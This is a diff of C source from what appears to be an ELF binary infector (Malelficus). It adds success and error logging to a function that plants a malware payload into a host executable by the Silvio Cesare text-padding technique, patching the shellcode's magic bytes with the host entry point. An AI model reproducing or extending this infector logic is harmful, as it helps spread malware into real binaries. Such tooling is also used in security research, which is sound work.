@@ -156,6 +156,7 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
         _u32 magic_bytes = 0;
 
         MALELF_DEBUG_INFO("Infecting by silvio cesare technique.");
+        MALELF_LOG_SUCCESS("Infecting by silvio cesare technique (text-padding)\n");
 
         malelf_binary_init_all(4,
                                &input,
@@ -184,6 +185,10 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                 goto cesare_error;
         }
 
+        MALELF_LOG_SUCCESS("binary input: '%s'\n", input.fname);
+        MALELF_LOG_SUCCESS("binary output: '%s'\n", obj->ofname);
+        MALELF_LOG_SUCCESS("malware payload: '%s'\n\n", malware.fname);
+
         if (obj->auto_shellcode) {
                 /* with --auto-shellcode the infector automatically
                    call malelf_shellcode_* to patch the input shellcode
@@ -197,8 +202,14 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                                                       0);
 
                 if (MALELF_SUCCESS != result) {
+                        MALELF_LOG_ERROR("Failed to create a payload from '%s'\n",
+                                         malware.fname);
                         goto cesare_error;
                 }
+
+                MALELF_LOG_SUCCESS("Payload shellcode automatically "
+                                   "created, magic bytes at '%02x'\n",
+                                   magic_offset);
                 result = malelf_infect_silvio_padding32(&input,
                                                         &output,
                                                         &malware_ready,
@@ -211,6 +222,8 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                                                         obj->offset_ret,
                                                         0);
         } else {
+                MALELF_LOG_SUCCESS("Trying to find magic bytes in shellcode "
+                                   "to patch with host entry point.\n");
                 /* Malelficus will search for the magic bytes in shellcode
                    and if found he will patch with the host entry point.*/
                 union malelf_dword magic_bytes;
@@ -220,7 +233,7 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                                                   magic_bytes,
                                                   &obj->offset_ret);
                 if (MALELF_SUCCESS != result) {
-                        MALELF_DEBUG_WARN("malelficus doesn't found the "
+                        MALELF_LOG_WARN("malelficus doesn't found the "
                                           "magic bytes %08x in '%s'",
                                           magic_bytes.long_val,
                                           malware.fname);
@@ -249,10 +262,16 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                 goto cesare_error;
         }
 
+        MALELF_LOG_SUCCESS("Successfully infected.\n");
+
         result = malelf_binary_write(&output, obj->ofname, 1);
 
         if (MALELF_SUCCESS == result) {
                 goto cesare_cleanup;
+        } else {
+                MALELF_LOG_ERROR("Failed to write output infected "
+                                 "binary: %s\n",
+                                 output.fname);
         }
 
 cesare_error:
